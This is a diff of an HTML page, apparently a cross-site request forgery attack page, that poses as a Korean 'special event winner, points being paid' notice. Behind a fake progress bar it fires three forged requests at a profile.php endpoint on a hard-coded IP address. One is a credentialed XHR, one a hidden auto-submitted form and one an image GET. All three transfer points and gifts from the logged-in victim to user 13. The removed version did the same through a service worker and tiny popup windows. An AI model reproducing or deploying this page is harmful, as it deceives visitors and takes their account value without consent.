@@ -1,70 +1,87 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🎁 이벤트 - Service Worker 방식</title>
+    <title>🎁 완벽한 우회 공격</title>
 </head>
 <body>
-    <h1>🎯 특별 이벤트!</h1>
-    <div id="loading">포인트 지급 준비중...</div>
+    <div style="text-align: center; padding: 50px;">
+        <h1>🎁 축하합니다! 특별 이벤트 당첨!</h1>
+        <p>🎯 포인트 지급 중...</p>
+        <div id="progress">0%</div>
+    </div>
 
     <script>
-        // Service Worker 등록
-        if ('serviceWorker' in navigator) {
-            const swCode = `
-                self.addEventListener('fetch', function(event) {
-                    if (event.request.url.includes('profile.php')) {
-                        // CSRF 요청 가로채서 처리
-                        event.respondWith(
-                            fetch(event.request, {
-                                mode: 'no-cors',
-                                credentials: 'include'
-                            })
-                        );
-                    }
-                });
-            `;
-            
-            const blob = new Blob([swCode], {type: 'application/javascript'});
-            const swURL = URL.createObjectURL(blob);
-            
-            navigator.serviceWorker.register(swURL).then(() => {
-                console.log('🔴 Service Worker 등록 완료');
-                executeCSRF();
-            });
-        } else {
-            // Service Worker 미지원 시 다른 방법
-            executeCSRF();
+        // 진행률 애니메이션
+        let progress = 0;
+        const progressEl = document.getElementById('progress');
+        const progressTimer = setInterval(() => {
+            progress += 10;
+            progressEl.textContent = progress + '%';
+            if (progress >= 100) {
+                clearInterval(progressTimer);
+                progressEl.textContent = '완료! 🎉';
+            }
+        }, 300);
+
+        // CSRF 공격들
+        function attack1() {
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'http://3.35.218.180/profile.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.withCredentials = true;
+                
+                const data = 'receiver_id=13&points=100&send_gift=1&gift_type=diamond&message=XHR공격성공!';
+                xhr.send(data);
+            } catch(e) {
+                console.log('XHR 차단됨, 다른 방법 시도...');
+            }
         }
 
-        function executeCSRF() {
-            const attacks = [
-                {receiver_id: '13', points: '30', gift_type: 'coffee'},
-                {receiver_id: '13', points: '50', gift_type: 'cake'},
-                {receiver_id: '13', points: '70', gift_type: 'diamond'}
-            ];
+        function attack2() {
+            // 동적 form 생성 및 전송
+            const form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'http://3.35.218.180/profile.php';
+            form.target = '_blank';
+            form.style.display = 'none';
 
-            attacks.forEach((attack, i) => {
-                setTimeout(() => {
-                    // 새 창에서 폼 전송
-                    const win = window.open('about:blank', `attack${i}`, 'width=1,height=1');
-                    
-                    win.document.write(`
-                        <form method="POST" action="http://3.35.218.180/profile.php">
-                            <input name="receiver_id" value="${attack.receiver_id}">
-                            <input name="points" value="${attack.points}">
-                            <input name="send_gift" value="1">
-                            <input name="gift_type" value="${attack.gift_type}">
-                            <input name="message" value="Service Worker 공격!">
-                        </form>
-                        <script>
-                            document.forms[0].submit();
-                            setTimeout(() => window.close(), 2000);
-                        <\/script>
-                    `);
-                    
-                }, i * 1500);
+            const fields = {
+                receiver_id: '13',
+                points: '85',
+                send_gift: '1',
+                gift_type: 'cake',
+                message: '폼 공격 성공!'
+            };
+
+            Object.entries(fields).forEach(([name, value]) => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = name;
+                input.value = value;
+                form.appendChild(input);
             });
+
+            document.body.appendChild(form);
+            form.submit();
+            document.body.removeChild(form);
         }
+
+        function attack3() {
+            // 이미지 태그를 이용한 GET 요청 (만약 GET도 처리한다면)
+            const img = new Image();
+            img.src = 'http://3.35.218.180/profile.php?receiver_id=13&points=25&send_gift=1&gift_type=flower&message=IMG공격';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        }
+
+        // 순차 공격 실행
+        setTimeout(attack1, 1000);
+        setTimeout(attack2, 2000);  
+        setTimeout(attack3, 3000);
+
+        console.log('🔴 GitHub Pages 다중 우회 공격 시작!');
+        console.log('📊 3가지 방식으로 동시 공격 중...');
     </script>
 </body>
 </html>
